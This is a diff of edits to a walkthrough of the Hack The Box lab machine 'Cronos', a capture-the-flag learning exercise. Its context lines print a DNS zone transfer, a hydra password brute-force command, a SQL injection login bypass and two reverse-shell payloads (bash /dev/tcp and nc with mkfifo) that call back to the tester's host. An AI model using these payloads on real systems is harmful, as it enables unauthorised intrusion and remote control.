@@ -22,7 +22,7 @@ Browsing to port 80 using the IP shows the Apache landing page. Browsing to `cro
 
 ![Cronos Homepage](screenshots/cronos_home.png)
 
-Since we are not getting much from the website, and that DNS is on the server - had a poke around the service. My DNS pentesting skills are still evolving - so I used the [HackTricks Pentesting DNS](https://book.hacktricks.xyz/pentesting/pentesting-dns) page for some advice. Trying a zone transfer yeilded a couple addiontinal domain names.
+Since we are not getting much from the website, and that DNS is on the server - had a poke around the DNS service. My DNS pentesting skills are still evolving - so I used the [HackTricks Pentesting DNS](https://book.hacktricks.xyz/pentesting/pentesting-dns) page for some advice. Trying a zone transfer yeilded a couple addiontinal domain names.
 
 ```none
 └─$ dig axfr @10.10.10.13 cronos.htb                                                                  
@@ -59,7 +59,7 @@ Guessing the username was probably `admin` - based on previous HTB experience. D
 hydra -l admin -P /usr/share/wordlists/rockyou.txt admin.cronos.htb http-post-form "/:username=^USER^&password=^PASS^:F=Your Login Name or Password is invalid"
 ```
 
-With nothing else to try enumerate, went back to the admin panel to try some more login attempts. Think my brain was not working becuase it took about 10 minutes before I thought of SQL injection. I hadn't used it for so long - that I think it was off my radar. The SQLi vulnerability was pretty bad, and almost any SQLi parload worked. The simplest example:
+With nothing else to try enumerate, went back to the admin panel to try some more login attempts. Think my brain was not working becuase it took about 10 minutes before I thought of SQL injection. I hadn't used it for so long - that I think it was off my radar. The SQLi vulnerability was pretty bad, and almost any SQLi parload worked. The simplest example was this payload against the username input:
 
 ```none
 ' -- 
@@ -85,7 +85,7 @@ Tried the common bash reverse shell, but it didn't work.
 command=bash -i >& /dev/tcp/10.10.14.56/9001 0>&1
 ```
 
-Second try was using `nc` which I checked existance of on the target machine with `which nc`. Then used the following payload:
+Second try was using `nc` which I checked existance of on the target machine with `which nc` before using the payload. Then used the following payload:
 
 ```none
 command=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.56 9001 >/tmp/f
@@ -152,6 +152,7 @@ With a shell as the `root` - just grab the flag from the usual place:
 
 ```none
 wc -c /root/root.txt
+33 /root/root.txt
 ```
 
 ## Lessons Learned
